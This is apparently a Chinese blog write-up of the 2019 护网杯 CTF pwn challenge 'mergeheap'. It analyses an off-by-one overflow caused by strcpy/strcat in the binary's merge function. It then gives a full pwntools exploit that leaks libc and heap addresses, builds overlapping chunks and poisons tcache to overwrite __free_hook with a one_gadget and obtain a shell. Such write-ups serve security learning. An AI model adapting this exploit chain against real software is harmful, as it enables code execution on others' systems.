---
title: 2019护网杯_mergeheap
date: 2019-09-10 20:24:26
tags: pwn
---
# mergeheap

## 审计与分析

### add

```c
int add()
{
  signed int i; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 14 && ptrs[i]; ++i )
    ;
  if ( i > 14 )
    return puts("full");
  printf("len:");
  v2 = read_num();
  if ( v2 < 0 || v2 > 1024 )
    return puts("invalid");
  ptrs[i] = malloc(v2);
  printf("content:");
  read_until_nil(ptrs[i], v2);
  dword_202060[i] = v2;
  return puts("Done");
}
```

最多14个堆块，大小在0到0x400之间，将每个堆块指针和堆块size存储在bss段上的全局数组处。

### show

会输出对应堆块指针中的值。

```c
int show()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx:");
  v1 = read_num();
  if ( v1 >= 0 && v1 <= 14 && ptrs[v1] )
    result = puts((const char *)ptrs[v1]);
  else
    result = puts("invalid");
  return result;
}
```
<!-- more -->
### delete

会free掉对应下标的堆块，然后将堆块指针置为null，堆块大小设置为0，不存在UAF、2Free等漏洞。

```c
int dele()
{
  _DWORD *v0; // rax
  int idx; // [rsp+Ch] [rbp-4h]

  printf("idx:");
  idx = read_num();
  if ( idx >= 0 && idx <= 14 && ptrs[idx] )
  {
    free((void *)ptrs[idx]);
    ptrs[idx] = 0LL;
    v0 = ptr_sizes;
    ptr_sizes[idx] = 0;
  }
  else
  {
    LODWORD(v0) = puts("invalid");
  }
  return (signed int)v0;
}
```

### merge

```c
int merge()
{
  int v1; // ST1C_4
  signed int i; // [rsp+8h] [rbp-18h]
  int first_idx; // [rsp+Ch] [rbp-14h]
  int second_idx; // [rsp+10h] [rbp-10h]

  for ( i = 0; i <= 14 && ptrs[i]; ++i )
    ;
  if ( i > 14 )
    return puts("full");
  printf("idx1:");
  first_idx = read_num();
  if ( first_idx < 0 || first_idx > 14 || !ptrs[first_idx] )
    return puts("invalid");
  printf("idx2:");
  second_idx = read_num();
  if ( second_idx < 0 || second_idx > 14 || !ptrs[second_idx] )
    return puts("invalid");
  v1 = ptr_sizes[first_idx] + ptr_sizes[second_idx];
  ptrs[i] = malloc(v1);
  strcpy((char *)ptrs[i], (const char *)ptrs[first_idx]);
  strcat((char *)ptrs[i], (const char *)ptrs[second_idx]);
  ptr_sizes[i] = v1;
  return puts("Done");
}
```

会malloc一个新的chunk，大小等于两个chunk大小之和，然后通过c标准库的strcpy和strcat函数实现字符串拷贝与拼接。这里显然存在溢出漏洞，因为strcpy/strcat会拷贝到NULL字符，而堆块的内容都是通过read函数逐字节读入的，如果不录入换行符就会读到相应的size大小处。所以若不手工录入NULL字符，并且存在堆块结构复用（复用下一个堆块的prev_size位），那么在调用`merge`时可以溢出到下一个chunk的size字段（off-by-one）。

利用这一点我们可以构造overlapping，改大下一个chunk的size字段，再结合tcache的机制，实现任意地址分配和任意地址写。

## 利用

### leak libc

比赛时我写的比较麻烦，因为有一段时间没有做题了，并且对tcache的机制也不是太熟悉。思路还是传统的通过leak unsorted bin中指向libc中main_arena的地址实现，但是如果申请chunk的大小位于tcache范围内，首先需要填满对应的tcache数组，所以我用了7个块填充。实际上，直接构造两个大块，然后利用merge构造出大于0x400的chunk，再释放就可以直接放入unsorted bin中。

```python
# leak libc & heap addr

add(0x80, "a"*0x80)# 0
add(0x80, "a"*0x80)# 1
add(0x80, "a"*0x80)# 2
add(0x80, "a"*0x80)# 3
add(0x80, "a"*0x80)# 4
add(0x80, "a"*0x80)# 5
add(0x80, "a"*0x80)# 6

add(0x80, "b"*0x80)# 7
add(0x10, "c"*0x10)# 8
add(0x80, "b"*0x80)# 9
add(0x18, "c"*0x18)# 10

for i in range(7):
	dele(i) # kong 0~6

dele(7) # kong 7
dele(9) # kong 9

add(0x8,"e"*8) # 0
show(0)
heap_addr = u64(p.recv(6+8)[-6:].ljust(8, "\x00")) - 0x6f0
print "heap addr is " + hex(heap_addr)
add(0x60,"e"*0x60) # 1

add(0x8,"e"*8) # 2
show(2)
addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc_addr = addr - 0x3ebd20
print "libc addr is " + hex(libc_addr)

one_gadget = libc_addr + 0x4f322
free_hook = libc_addr + libc.symbols['__free_hook']

add(0x60,"\x00" * 0x60) # 3
```

### Overlapping

当第一个chunk为0x1f8，第二个chunk为0x90时，`merge`函数会`malloc(0x28f)`，这时我们前述的off-by-one漏洞就可以被触发，我们可以顺利的溢出下一个chunk的size字段。将改大的chunk释放后再次申请时就可以溢出被重叠的堆块，而这个堆块首先被放在tcache数组中，所以我们也就溢出修改了next指针。令next指针指向`free_hook`，那么再申请两次时就会将堆块申请在`free_hook`处，最终实现任意地址写。

```python
# make overlapping & getshell

add(0x1f8, "\x80" * 0x1f8) # 4
add(0x90, "\x80" * 0x90) # 5
add(0x280, "\x80" * 0x280) # 6
add(0x40, "\x80"*0x40) # 7
add(0x30, "\x00" * 0x30) # 9
dele(6) # kong 6
merge(4, 5) # 6 make 7's size bigger
dele(7) # kong 7
dele(9) # kong 9 0x30 tcache
fake_chunk = "a"* 0x40 + p64(0) + p64(0x41) + p64(free_hook) # overflow 
add(0x70, fake_chunk.ljust(0x70, "\x00")) # 7

add(0x30, "a"*0x30)
add(0x30, p64(one_gadget).ljust(0x30,"\x00")) # tcache poisoning

dele(3)
```

### 完整exp

```python
from pwn import *
context.log_level = "debug"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process("./mergeheap")
elf = ELF("./mergeheap")

def add(size, content):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("len:")
	p.sendline(str(size))
	p.recvuntil("content:")
	p.send(content)

def show(idx):
	p.recvuntil(">>")
	p.sendline("2")
	p.recvuntil("idx:")
	p.sendline(str(idx))

def dele(idx):
	p.recvuntil(">>")
	p.sendline("3")
	p.recvuntil("idx:")
	p.sendline(str(idx))


def merge(idx1, idx2):
	p.recvuntil(">>")
	p.sendline("4")
	p.recvuntil("idx1:")
	p.sendline(str(idx1))
	p.recvuntil("idx2:")
	p.sendline(str(idx2))

# leak libc & heap addr

add(0x80, "a"*0x80)# 0
add(0x80, "a"*0x80)# 1
add(0x80, "a"*0x80)# 2
add(0x80, "a"*0x80)# 3
add(0x80, "a"*0x80)# 4
add(0x80, "a"*0x80)# 5
add(0x80, "a"*0x80)# 6

add(0x80, "b"*0x80)# 7
add(0x10, "c"*0x10)# 8
add(0x80, "b"*0x80)# 9
add(0x18, "c"*0x18)# 10

for i in range(7):
	dele(i) # kong 0~6

dele(7) # kong 7
dele(9) # kong 9

add(0x8,"e"*8) # 0
show(0)
heap_addr = u64(p.recv(6+8)[-6:].ljust(8, "\x00")) - 0x6f0
print "heap addr is " + hex(heap_addr)
add(0x60,"e"*0x60) # 1

add(0x8,"e"*8) # 2
show(2)
addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc_addr = addr - 0x3ebd20
print "libc addr is " + hex(libc_addr)

one_gadget = libc_addr + 0x4f322
free_hook = libc_addr + libc.symbols['__free_hook']

add(0x60,"\x00" * 0x60) # 3

# make overlapping & getshell

add(0x1f8, "\x80" * 0x1f8) # 4
add(0x90, "\x80" * 0x90) # 5
add(0x280, "\x80" * 0x280) # 6
add(0x40, "\x80"*0x40) # 7
add(0x30, "\x00" * 0x30) # 9
dele(6) # kong 6
merge(4, 5) # 6 make 7's size bigger
dele(7) # kong 7
dele(9) # kong 9 0x30 tcache
fake_chunk = "a"* 0x40 + p64(0) + p64(0x41) + p64(free_hook) # overflow 
add(0x70, fake_chunk.ljust(0x70, "\x00")) # 7

add(0x30, "a"*0x30)
add(0x30, p64(one_gadget).ljust(0x30,"\x00")) # tcache poisoning

dele(3)

p.interactive()



```



